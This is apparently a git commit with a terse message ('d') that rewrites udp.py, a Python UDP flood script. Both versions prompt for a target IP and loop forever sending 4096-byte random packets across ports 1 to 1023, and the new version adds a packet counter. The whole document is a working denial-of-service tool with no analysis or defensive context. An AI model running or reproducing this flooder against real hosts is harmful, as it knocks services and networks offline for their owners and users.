28a636be8528d2d131cf60e17729ae01391ed845
DCRalph <43304937+DCRalph@users.noreply.github.com>
2022-04-13 15:11:02 +1200

    d

--- udp.py
+++ udp.py
@@ -1,12 +1,5 @@
-import socket
-import random
-import sys
-sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-bytes=random._urandom(4096)
-ip=raw_input('Target IP: ')
-port=1
+import socket, random; sock, bytes, port, send, ip = socket.socket(socket.AF_INET,socket.SOCK_DGRAM), random._urandom(4096), 1, 0, input('Target IP: ')
 while 1:
-    sock.sendto(bytes,(ip,port))
-    port=port+1
-    if port > 1023:
-            port=1
+    sock.sendto(bytes,(ip,port)); send += 1; port += 1
+    if port > 1023: port = 1
+    if not send % 10000: print(send)
